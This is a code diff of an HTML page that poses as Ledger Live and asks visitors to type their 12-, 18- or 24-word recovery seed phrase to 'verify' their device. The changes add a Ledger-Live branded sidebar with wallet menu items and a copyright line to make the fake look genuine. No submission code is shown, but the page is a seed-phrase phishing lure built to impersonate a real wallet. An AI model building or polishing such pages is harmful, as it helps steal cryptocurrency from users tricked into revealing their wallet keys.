@@ -3,137 +3,193 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verify Seed Phrase - Ledger</title>
+  <title>Verify Seed Phrase</title>
   <style>
     body {
-      background-color: #0d0d0d;
+      margin: 0;
+      background-color: #0e0e10;
       color: white;
       font-family: "Courier New", monospace;
+      display: flex;
+      height: 100vh;
+    }
+
+    /* Sidebar */
+    .sidebar {
+      width: 260px;
+      background-color: #141417;
+      padding: 30px 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      box-shadow: 2px 0 8px rgba(0,0,0,0.5);
+    }
+
+    .logo {
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 40px;
+      display: flex;
+      align-items: center;
+      letter-spacing: 1px;
+    }
+
+    .menu {
+      flex: 1;
+    }
+
+    .menu-item {
+      color: #bcbcbc;
+      padding: 12px 0;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      transition: color 0.2s;
+    }
+
+    .menu-item:hover {
+      color: #8b5cf6;
+    }
+
+    .menu-item svg {
+      margin-right: 10px;
+      width: 18px;
+      height: 18px;
+    }
+
+    /* Main Content */
+    .main {
+      flex: 1;
+      padding: 60px;
       text-align: center;
-      margin: 0;
-      padding: 0;
+      overflow-y: auto;
     }
 
     h1 {
-      margin-top: 50px;
       font-size: 28px;
-      letter-spacing: 2px;
+      margin-bottom: 20px;
+      font-weight: bold;
     }
 
     p {
-      color: #ccc;
-      margin-bottom: 30px;
-      font-size: 14px;
+      color: #aaa;
+      font-size: 15px;
+      line-height: 1.5;
     }
 
     .word-buttons {
-      margin: 20px auto;
-      display: flex;
-      justify-content: center;
-      gap: 15px;
+      margin: 30px 0;
     }
 
     .word-buttons button {
-      background: #1a1a1a;
-      color: #fff;
-      border: 1px solid #555;
+      background: #1f1f23;
+      color: white;
+      border: 1px solid #333;
       padding: 10px 20px;
+      margin: 0 5px;
       border-radius: 8px;
       cursor: pointer;
-      transition: 0.3s;
+      font-weight: bold;
     }
 
-    .word-buttons button:hover,
-    .word-buttons button.active {
-      background: #6c63ff;
-      border-color: #6c63ff;
+    .word-buttons button:hover {
+      background: #8b5cf6;
     }
 
-    .phrase-container {
+    .seed-grid {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
       gap: 15px;
-      width: 60%;
-      margin: 30px auto;
-      max-width: 600px;
+      justify-items: center;
+      margin-top: 30px;
+      max-width: 800px;
+      margin-left: auto;
+      margin-right: auto;
     }
 
-    .phrase-container input {
-      background: #1a1a1a;
-      border: 1px solid #444;
-      color: white;
-      padding: 10px;
+    .seed-grid input {
+      background-color: #1a1a1d;
+      border: 1px solid #333;
       border-radius: 6px;
+      color: white;
+      padding: 12px;
+      width: 100%;
+      font-size: 15px;
       text-align: center;
-      font-size: 14px;
-      outline: none;
-      transition: border 0.3s;
+      transition: border 0.2s;
     }
 
-    .phrase-container input:focus {
-      border-color: #6c63ff;
+    .seed-grid input:focus {
+      border: 1px solid #8b5cf6;
+      outline: none;
     }
 
     .continue-btn {
-      background: #6c63ff;
-      color: white;
+      margin-top: 40px;
+      background: #8b5cf6;
       border: none;
-      padding: 12px 35px;
+      color: white;
+      font-size: 16px;
+      padding: 12px 40px;
       border-radius: 25px;
       cursor: pointer;
-      font-size: 16px;
-      margin-top: 20px;
       transition: background 0.3s;
     }
 
     .continue-btn:hover {
-      background: #837dff;
-    }
-
-    @media (max-width: 600px) {
-      .phrase-container {
-        grid-template-columns: repeat(2, 1fr);
-        width: 80%;
-      }
+      background: #a78bfa;
     }
   </style>
 </head>
 <body>
-  <h1>VERIFY SEED PHRASE OF YOUR DEVICE</h1>
-  <p>Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.<br>
-  **Ledger does not keep a copy of your recovery phrase.<br>
-  **ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>
 
-  <div class="word-buttons">
-    <button onclick="generateInputs(12)" class="active">12 Words</button>
-    <button onclick="generateInputs(18)">18 Words</button>
-    <button onclick="generateInputs(24)">24 Words</button>
+  <!-- Sidebar -->
+  <div class="sidebar">
+    <div>
+      <div class="logo">⟦LEDGER–LIVE⟧</div>
+      <div class="menu">
+        <div class="menu-item">📊 Portfolio</div>
+        <div class="menu-item">💹 Market</div>
+        <div class="menu-item">📂 Accounts</div>
+        <div class="menu-item">📤 Send</div>
+        <div class="menu-item">📥 Receive</div>
+        <div class="menu-item">💱 Buy/Sell</div>
+        <div class="menu-item">🔄 Swap</div>
+        <div class="menu-item">🧰 Manager</div>
+      </div>
+    </div>
+    <div style="color:#777; font-size:12px;">© 2025 Ledger-Live</div>
   </div>
 
-  <div id="phraseContainer" class="phrase-container"></div>
+  <!-- Main Section -->
+  <div class="main">
+    <h1>VERIFY SEED PHRASE OF YOUR DEVICE</h1>
+    <p>Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.</p>
+    <p>**Ledger does not keep a copy of your recovery phrase.</p>
+    <p>**ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>
 
-  <button class="continue-btn">Continue...</button>
+    <div class="word-buttons">
+      <button>12 Words</button>
+      <button>18 Words</button>
+      <button>24 Words</button>
+    </div>
 
-  <script>
-    const phraseContainer = document.getElementById('phraseContainer');
-    const buttons = document.querySelectorAll('.word-buttons button');
+    <div class="seed-grid">
+      <input placeholder="1">
+      <input placeholder="2">
+      <input placeholder="3">
+      <input placeholder="4">
+      <input placeholder="5">
+      <input placeholder="6">
+      <input placeholder="7">
+      <input placeholder="8">
+      <input placeholder="9">
+      <input placeholder="10">
+      <input placeholder="11">
+      <input placeholder="12">
+    </div>
 
-    function generateInputs(count) {
-      phraseContainer.innerHTML = '';
-      for (let i = 1; i <= count; i++) {
-        const input = document.createElement('input');
-        input.type = 'text';
-        input.placeholder = i;
-        phraseContainer.appendChild(input);
-      }
-
-      // active button highlight
-      buttons.forEach(btn => btn.classList.remove('active'));
-      event.target.classList.add('active');
-    }
-
-    // default load: 12 words
-    window.onload = () => generateInputs(12);
-  </script>
+    <button class="continue-btn">Continue...</button>
+  </div>
 </body>
 </html>
